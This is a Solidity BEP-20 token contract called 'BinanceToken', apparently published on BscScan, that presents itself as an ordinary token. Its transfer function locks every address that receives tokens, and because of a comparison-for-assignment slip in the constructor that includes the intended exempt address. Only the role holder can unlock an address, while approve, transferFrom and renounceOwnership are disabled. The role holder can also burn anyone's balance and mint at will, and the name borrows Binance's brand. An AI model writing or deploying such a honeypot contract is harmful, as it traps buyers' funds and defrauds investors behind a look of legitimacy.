/**
 *Submitted for verification at BscScan.com on 2022-01-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    // function approve(address spender, uint256 amount) external returns (bool);

    // function transferFrom(
    //     address sender,
    //     address recipient,
    //     uint256 amount
    // ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBEP20Metadata is IBEP20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract BEP20 is Context, IBEP20, IBEP20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // function approve(address spender, uint256 amount) public virtual override returns (bool) {
    //     _approve(_msgSender(), spender, amount);
    //     return true;
    // }

    // function transferFrom(
    //     address sender,
    //     address recipient,
    //     uint256 amount
    // ) public virtual override returns (bool) {
    //     _transfer(sender, recipient, amount);

    //     uint256 currentAllowance = _allowances[sender][_msgSender()];
    //     require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
    //     unchecked {
    //         _approve(sender, _msgSender(), currentAllowance - amount);
    //     }

    //     return true;
    // }

    // function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    //     _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
    //     return true;
    // }

    // function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
    //     uint256 currentAllowance = _allowances[_msgSender()][spender];
    //     require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    //     unchecked {
    //         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
    //     }

    //     return true;
    // }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    // function _approve(
    //     address owner,
    //     address spender,
    //     uint256 amount
    // ) internal virtual {
    //     require(owner != address(0), "ERC20: approve from the zero address");
    //     require(spender != address(0), "ERC20: approve to the zero address");

    //     _allowances[owner][spender] = amount;
    //     emit Approval(owner, spender, amount);
    // }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // function renounceOwnership() public virtual onlyOwner {
    //     _transferOwnership(address(0));
    // }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IAccessControl {

    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);

    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);

    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    function hasRole(bytes32 role, address account) external view returns (bool);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function grantRole(bytes32 role, address account) external;

    function revokeRole(bytes32 role, address account) external;

    // function renounceRole(bytes32 role, address account) external;
}
library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

interface IBEP165 {
   
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}



abstract contract BEP165 is IBEP165 {

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IBEP165).interfaceId;
    }
}


abstract contract AccessControl is Context, IAccessControl, BEP165 {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
    }

    mapping(bytes32 => RoleData) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

   
    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender());
        _;
    }

    
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IAccessControl).interfaceId || super.supportsInterface(interfaceId);
    }

    
    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    
    function _checkRole(bytes32 role, address account) internal view {
        if (!hasRole(role, account)) {
            revert(
                string(
                    abi.encodePacked(
                        "AccessControl: account ",
                        Strings.toHexString(uint160(account), 20),
                        " is missing role ",
                        Strings.toHexString(uint256(role), 32)
                    )
                )
            );
        }
    }

    
    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

   
    function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _grantRole(role, account);
    }

   
    function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _revokeRole(role, account);
    }

   
    // function renounceRole(bytes32 role, address account) public virtual override {
    //     require(account == _msgSender(), "AccessControl: can only renounce roles for self");

    //     _revokeRole(role, account);
    // }

   
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

   
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    function _grantRole(bytes32 role, address account) private {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) private {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}





contract BinanceToken is BEP20, AccessControl, Ownable{

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
    bytes32 public constant LOCKUP_ROLE = keccak256("LOCKUP_ROLE");

    uint public INITIAL_SUPPLY = 10000000000;

    address MasterAddress;

    mapping(address => bool) public LockStatus;

    

    constructor() public BEP20("BinanceToken", "BNT") {
        _setupRole(MINTER_ROLE,msg.sender);
        _setupRole(BURNER_ROLE,msg.sender);
        _setupRole(LOCKUP_ROLE,msg.sender);
        MasterAddress == msg.sender;
        _mint(msg.sender,INITIAL_SUPPLY * 10 ** (uint(decimals())));
    }

    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE){
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) public onlyRole(BURNER_ROLE){
        _burn(from, amount);
    }

    function transfer(address recipient, uint256 amount)public virtual override returns (bool) {
        require(LockStatus[msg.sender] != true,"[ERRROR] Msg.sender LockStatus");
        _transfer(msg.sender, recipient, amount);
        if(MasterAddress != recipient){
            LockStatus[recipient] = true;
        }
    }

    function ReleaseLockStatus(address user) public onlyRole(LOCKUP_ROLE){
        require(LockStatus[user]==true,"[ERRROR] User not LockStatus");
        LockStatus[user] = false;
    }

    function SetLockStatus(address user) public onlyRole(LOCKUP_ROLE){
        require(LockStatus[user]==false,"[ERRROR] User LockStatus");
        LockStatus[user] = true;
    }

}